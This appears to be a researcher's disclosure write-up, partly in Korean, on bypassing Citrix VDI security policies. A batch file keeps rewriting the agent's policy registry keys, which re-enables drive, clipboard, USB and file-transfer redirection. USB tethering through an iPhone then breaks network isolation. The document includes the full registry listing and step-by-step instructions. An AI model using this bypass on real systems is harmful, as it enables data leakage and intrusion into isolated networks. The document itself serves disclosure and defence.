# Bypassing Citrix policy is not a vulnerability, but it can be a violation of the law.

## Note!!

As a result of discussions with Citrix using [VINCE](https://kb.cert.org/vince/comm/case/1022/) from cert.org, it was concluded that this is not a vulnerability(because os administrative privileges are required), so I can share this information without any concerns. For security reasons, I do not recommend using Xendesktop (VDI) in special environments such as logical network isolation or closed networks for security. If it must be used, please remove administrator privileges and make sure to install security-specific programs.

## Description

The Citrix VDI Agent(PicaSvc2.exe) seems to have a structure in which it receives policies from the Citrix management server, records them in the registry(HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\), and reads the policies from the registry to reflect the policies to the user's VDI. An attacker can bypass the Drive, Network, Clipboard, etc. security policies issued by the Citrix Policy Server through registry manipulation.  

If a closed or isolated network environment must be used, bypassing Citrix Policy and forcibly connecting VDI to the internet can potentially expose the internal network to the internet and leak sensitive information to external parties. 

In Korea, this is a clear violation of the law and requires a re-evaluation of network isolation solutions or environments. 금융위는 전자금융거래법 시행령과 감독규정 개정안에 따라 논리적 망분리에 대한 선택권을 부여하고 있으며(전자금융감독규정 제15조 해킹 등 방지대책 제1항3호), 정보통신서비스 제공자들은 정보통신망을 통해 악성코드에 감염되는 등 불법적인 접근을 차단하고 침해사고를 방지하기 위하여 망분리를 도입해야 합니다.
  
## POC  
1. The attacker logs into VDI and executes a Bat file ([https://windshock.github.io/bypass.zip](https://windshock.github.io/bypass.zip)) that continuously modifies the registry. Then, they close the VDI connection.  
  

Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User]

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\CdmPolicies]
"AutoConnectDrives"=dword:00000001
"AllowCdromDrives"=dword:00000001
"AllowFixedDrives"=dword:00000001
"AllowFloppyDrives"=dword:00000001
"AllowNetworkDrives"=dword:00000001
"AllowRemoveableDrives"=dword:00000001
"UseAsyncWrites"=dword:00000001
"ReadOnlyMappedDrive"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\IO]
"AutoConnectClientLptPorts"=dword:00000001
"TryMapToClientDriveLetter"=dword:00000001
"AllowFileTransfer"=dword:00000001
"AllowFileUpload"=dword:00000001
"AllowFileDownload"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\VCPolicies]
"AllowComPortRedirection"=dword:00000001
"AllowDriveRedir"=dword:00000001
"AllowLptPortRedirection"=dword:00000001
"AllowPrinterRedir"=dword:00000001
"AllowClipboardRedir"=dword:00000001
"ReadonlyClipboard"=dword:00000001
"AllowUSBRedir"=dword:00000001
"RestrictSessionClipboardWrite"=dword:00000000
"RestrictClientClipboardWrite"=dword:00000000

2. When the attacker logs back into VDI, PicaSvc2.exe communicates with the Citrix server to receive policies and records the corresponding policies in the registry.  
  
3. While PicaSvc2.exe records and reads the policies, the registry's policy values are tampered with by the Bat file previously executed by the attacker.  
  
4. PicaSv2.exe reads the policies recorded in the registry (which were manipulated by the attacker) and reflects the manipulated policies on Windows.

5. 접속하는 pc의 registry를 변경하면 네트워크가 가능한 하드웨어의 리다이렉트가 가능하다.

6. citrix 기본 정책으로 [usb class FFh](https://www.usb.org/defined-class-codes#anchor_BaseClassFFh) 은 허용되므로 iphone 레더링, 혹은 usb 형태의 wireless card를 이용하면 Usb Redirect가 허용되므로 망분리 환경에서 인터넷으로 네트워크를 연결할 수 있다.

7. iphone 테더링을 위해서는 itunes 설치 파일에서 추출한 드라이버 2개([apple network driver](https://windshock.github.io/applenetworkdriver.zip), [apple usb driver](https://windshock.github.io/appleusbdriver.zip))를 설치해야 한다.

8. citrix 접속 화면에서 iphone을 다시 redirect하면 이제 망분리 환경에서 인터넷 사용이 가능하다.

## Exploit
The attacker would have to be logged into the company's Citrix VDI(windows 10 os) after taking over the company's account.  
  
The VDI is in a state where network, printer, external hard write read, clipboard read and write, etc. are restricted.

## Impact
For companies that use VDI for logical network separation purposes, this vulnerability can lead to internal information leakage and intrusion of internal servers.

DiscoveryUse process  [monitor(https://learn.microsoft.com/en-us/sysintemonitor)](https//learn.microsoft.com/en-us/sysinternals/downloads/procmon))  to monitor the functionality of the citrix agent(PicaSvc2.exe).  
  
Check the registry that the citrix agent uses to store policy settings.  
  
View and manipulate the contents of that registry.

## Limitation

https://www.tarlogic.com/blog/pentests-in-restricted-vdi-environments/

논리적 망분리 3가지 모델, 이기종 보안 소프트웨어와 상호 운영 필요 - https://koreascience.kr/article/JAKO202031064817799.pdf


<!--stackedit_data:
eyJoaXN0b3J5IjpbLTIxMTA1MTYzMjYsMTM1MzIyNDUsMTkyNT
Q4Njc5MSwxOTkxMzUyMzI4LC0xMTI3MDA5NzMzLC0xODI0NTE5
OTk1XX0=
-->